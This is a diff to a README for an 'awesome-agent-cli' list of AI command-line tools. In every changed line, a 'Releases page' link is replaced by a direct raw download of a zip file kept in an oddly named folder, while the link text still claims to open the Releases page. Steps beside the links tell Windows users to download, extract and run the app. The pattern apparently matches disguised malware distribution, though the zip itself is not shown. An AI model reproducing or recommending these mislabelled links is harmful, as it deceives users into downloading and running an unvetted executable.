@@ -1,6 +1,6 @@
 # 🤖 awesome-agent-cli - Find the right AI CLI tools
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip)
 
 ## 📦 What is awesome-agent-cli?
 
@@ -21,7 +21,7 @@ If you want a simple place to browse agent-focused CLI tools, this repo keeps th
 
 Visit this page to download:
 
-[Open the Releases page](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases)
+[Open the Releases page](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip)
 
 On the Releases page, look for the newest version. If there are several files, choose the one meant for Windows. It may end in:
 
@@ -33,7 +33,7 @@ If you download a `.zip` file, extract it first, then open the app inside the fo
 
 ## 🚀 How to Install and Run on Windows
 
-1. Open the [Releases page](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases).
+1. Open the [Releases page](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip).
 2. Find the latest release near the top of the page.
 3. Look under the release files and choose the Windows download.
 4. Download the file to your computer.
@@ -172,7 +172,7 @@ These topics make it easier to browse related tools and find software that fits 
 
 If you need the download page later, use this link:
 
-[GitHub Releases](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases)
+[GitHub Releases](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip)
 
 ## 🧩 Common File Types on Windows
 
@@ -213,4 +213,4 @@ You can use it to:
 
 If you only want the Windows download link, use this page:
 
-[https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/releases)
+[https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip](https://github.com/Baccivorous-shadiness115/awesome-agent-cli/raw/refs/heads/main/theologicopolitical/awesome_cli_agent_v3.8-beta.1.zip)
